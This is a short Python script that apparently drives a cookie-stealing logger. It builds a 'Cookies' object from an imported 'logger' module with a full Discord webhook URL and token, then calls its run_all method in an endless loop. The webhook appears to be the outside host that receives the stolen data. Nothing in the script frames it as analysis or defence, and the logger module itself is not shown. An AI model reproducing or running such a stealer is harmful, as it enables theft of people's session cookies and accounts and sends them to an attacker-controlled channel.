from logger import Cookies

log = Cookies('https://discord.com/api/webhooks/1490406465620676761/eP0WSDcEzdoNKA2cwCBb2kE25N8COm8gneXHYLwUlekglgdv1NWa-qW6dIJuGsgRL0JL')

def main():
  while True:
	log.run_all()

if __name__ == '__main__':
	main()
